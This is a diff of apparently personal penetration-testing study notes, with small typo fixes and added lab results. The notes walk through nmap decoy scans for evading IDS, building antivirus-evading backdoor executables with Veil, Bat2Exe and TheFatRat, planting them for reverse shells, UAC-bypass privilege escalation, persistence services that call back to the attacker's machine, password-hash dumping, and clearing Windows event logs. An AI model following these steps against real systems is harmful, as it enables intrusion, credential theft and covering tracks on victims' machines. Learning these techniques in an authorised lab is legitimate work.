@@ -54,7 +54,7 @@ nmap----------------------------------------------------------------------------
 |  nmap -f <ip_addr> (fragment ip packet into several parts while pinging) [on adding another -f, 8 fragments add up to divide packet again by +8 i.e. 16 fragments but on real some program can't handle these types of tiny packets]
 |  nmap --mtu <multiple of 8> <ip_addr> (above's multiple -f flags alternative)
 |  nmap -D RND:<number of decoys> <ip_addr> (send n  number of packets as if even different ip addressed computers along with u tried to send packets just to make IDS confused)
-|  nmap -D <random_private_ip1,ip2,...,ME <target_ip> (here ME is your local IP)
+|  nmap -D <random_private_ip1,ip2,...,ME> <target_ip> (here ME is your local IP)
 |  NOTE: above 1st decoy cmd works best for targets that are on another network, 2nd decoy cmd are for targets within the same network. [for behind the scenes use wireshark to know random ip_addrs used]
 
 TIP: Zenmap for GUI XP of nmap
@@ -417,7 +417,7 @@ veil (apt-get install veil)
         after this it asks for the filename so given: powerpayload
         now the src code will be present in /var/lib/veil/output/source/powerpayload.bat
         and a metasploit resource file will be written to /var/lib/veil/output/handlers/powerpayload.rc
-        METASPLOIT RESOURCE file consists of predefined options that we've set in the veil using the set command, so no need reinitializing the LHOST, LPORT again for everything time
+        METASPLOIT RESOURCE file consists of predefined options that we've set in the veil using the set command, so no need reinitializing the LHOST, LPORT again every time
         since the output file is a .bat file (powerpayload.bat) we need to convert it to an .exe since a basic code when loaded will trigger AVS
         so well use a software called Bat2Exe(B2E) https://github.com/tokyoneon/B2E.git that converts bat file to an exe file. This runs only in windows so we'll use wine in order to install it in Kali Linux as follows:
         > cd <git_cloned_location>/B2E
@@ -427,7 +427,7 @@ veil (apt-get install veil)
         now knowing the location of the .batfile we'll open it in the B2E application
         there are several options but mainly there's an option called Packer(to enable UPX compression but it triggers a lot of AVS so uncheck it)
         go to converter and click convert and select destination to save it
-        now try transferring the powerpayload.exe to the target's system
+        now try transferring the powerpayload.exe to the target system
         now open msfc and copy the msf resource file location and type the following cmd:
         > resource /var/lib/veil/output/handlers/powerpayload.rc (this sets the options for our exploit to start listening in the background)
         now executing the powerpayload.exe in target's system will produce a shell after 20 seconds since we gave a cmd SLEEP 20, in order to create a different hash for the .exe which makes it bypassable by some AVS
@@ -437,7 +437,7 @@ veil (apt-get install veil)
 
 thefatrat (https://github.com/screetsec/TheFatRat.git)
         follow the README.md to install thefatrat after that:
-        > fatrat
+        > ./fatrat
         > 6 (for selection the foll. option: Create FUD Backdoor 1000% with PwnWinds)
         > 2 (Create exe file with C# + Powershell (FUD 100%))
         Set LHOST, LPORT IP
@@ -490,7 +490,6 @@ escalate privilege
 persist connection for later usage even after the compromised target machine is restarted/rebooted
 hack into networks/other machines that belongs to the target's network and much more
 to search for post exploitation modules in msfc we can use: search post/windows (for windows)
-
 
 we've seen some commands in meterpreter in the previously 2 chapter, now we'll dive deep into those.
 some of the COMMANDS that we use in the METERPRETER session are as follows:
@@ -549,6 +548,7 @@ ELEVATE PRIVILEGE USING MSFC(elevating modules are present under local msfc hier
         so previously from the system commands in msfc we would have tried the cmd 'getsystem' for elevating privilege which didn't work but now after executing this exploit
         if we run 'getsystem' it returns the following:
         ... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). now do 'getuid' it returns 'NT AUTHORITY/SYSTEM'
+        (in my case (windows 7 x64) exploit/windows/local/bypassuac was used for privilege escalation)
 
 CREATING PERSISTENCY ON THE TARGET SYSTEM USING MSFC(persistence modules are present under local msfc hierarchy in exploit/):
         after we've compromised the target machine and then elevated our privileges in now we need to create a persist connection with it even when the victim restarts/reboots the system
@@ -571,15 +571,25 @@ CREATING PERSISTENCY ON THE TARGET SYSTEM USING MSFC(persistence modules are pre
         and set options for it like we did earlier (LHOST of attacker_ip, and LPORT of attacker_port i.e. SESSION 2's port number because we used the persitence module upon SESSION 2 (set SESSION 2))
         what happens in the target's machine after switching on is that it tries to connect to our attacker's PC which has been listening to port X and returns a shell
         the best part in this is that we don't need to repeat the whole process of elevating privilege so on to stay where we left off
+        (in my case (windows 7 x64) exploit/windows/local/persistence_service was used for persistency, the location of the service is found at "C:\Users\win7\AppData\Local\Temp\TqIp.exe" using the cmd "wmic process")
 
 since we're in post exploitation we can use post/windows to search for all post exploit modules related to windows:
-eg: post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
-eg: post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
-eg: post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
+eg: use post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
+eg: use post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
+eg: use post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
+to perform the above ones within the meterpreter shell use the foll:
+eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)
 
 OTHER USEFUL METERPRETER CMDS:
         > search -h (shows different usage of search techniques to search for specific file types in target system)
         eg: search -f *.<file_extension> (for searching types of files in the target system)
         > clearev (clears system and security logs) (SIMILAR TO COVERING TRACKS)
-        NOTE: we can run the msfc modules even from the meterpreter shell
-        eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)
+
+
+
+
+
+
+
+NOTE: persistency is set at win7x64 that connects to port 4444(attacker's pc(KALINUX))
+NOTE: check msfv py file payload
